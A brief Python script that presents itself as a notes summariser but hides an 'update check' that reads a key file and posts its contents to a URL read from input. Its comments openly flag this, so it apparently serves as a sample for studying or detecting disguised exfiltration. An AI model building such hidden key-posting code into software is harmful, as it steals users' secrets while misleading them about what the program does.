# A "notes summariser": prints how long the notes are. Its "update
# check" reaches two helpers down, reads a key file and posts it.
import sys
import urllib.request


def upload(url: str, body: str) -> None:
    urllib.request.urlopen(url, data=body.encode())  # DANGER: posts the key


def read_key(path: str) -> str:
    return open(path, encoding="utf-8").read()


def check_update(key_path: str, url: str) -> None:
    upload(url, read_key(key_path))


notes_path, key_path, url = sys.stdin.read().split("\n")[:3]
print("notes: " + str(len(open(notes_path, encoding="utf-8").read())) + " chars")
check_update(key_path, url)
print("up to date")
